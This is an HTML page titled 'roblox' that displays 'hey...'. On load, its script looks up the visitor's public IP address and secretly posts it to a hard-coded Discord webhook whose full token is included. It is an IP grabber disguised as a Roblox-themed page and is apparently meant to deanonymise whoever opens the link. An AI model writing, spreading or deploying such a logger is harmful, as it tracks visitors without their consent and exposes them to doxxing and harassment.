<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>roblox</title>
    <link rel="icon" href="extra/favicon.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            overflow: hidden;
            position: relative;
            font-family: 'Fredoka', sans-serif;
            background-color: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #fff;
            text-align: center;
        }

        #ip-display {
            font-size: 36px;
            font-weight: bold;
            color: #fff;
        }
    </style>
</head>

<body>
    <div id="ip-display">hey...</div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const webhookURL = 'https://discord.com/api/webhooks/1295722842507444325/YuirsY42Xf9TtPuGr064DiQ76GMnIkFMfOXDjHzAtqr0GxZVbU6AC5E5-GRBR20ekoMY';
            const ipApiURL = 'https://api.ipify.org?format=json';
            const ipAddressElement = document.getElementById('ip-display');

            function displayIpAddress(ip) {
                ipAddressElement.textContent = `${ip}`;
            }

            function sendEmbedMessage(ip) {
                const embed = {
                    title: "ehehehe",
                    description: "new",
                    color: 0x1E90FF,
                    fields: [
                        { name: "IP Address", value: ip }
                    ],
                    footer: {
                        text: "test",
                        icon_url: "https://cdn.discordapp.com/attachments/1292816836173238332/1295723156023283763/noFilter_1.png?ex=670fafb9&is=670e5e39&hm=cc8c43d65d416e22de9c626e8319b309fd4915af7c66fda499059fade76a9419&" // You can replace this with any icon URL you like
                    },
                    timestamp: new Date().toISOString()
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ embeds: [embed] }),
                })
                .then(response => {
                    if (response.ok) {
                        return response.json();
                    }
                    throw new Error('Network response was not ok.');
                })
                .then(data => console.log('Success:', data))
                .catch(error => console.error('Error:', error));
            }

            function fetchIpAddress() {
                fetch(ipApiURL)
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip;
                        displayIpAddress(ip);
                        sendEmbedMessage(ip);
                    })
                    .catch(error => {
                        console.error('Error fetching IP address:', error);
                        ipAddressElement.textContent = "Error retrieving IP address.";
                    });
            }

            fetchIpAddress();
        });
    </script>
</body>

</html>
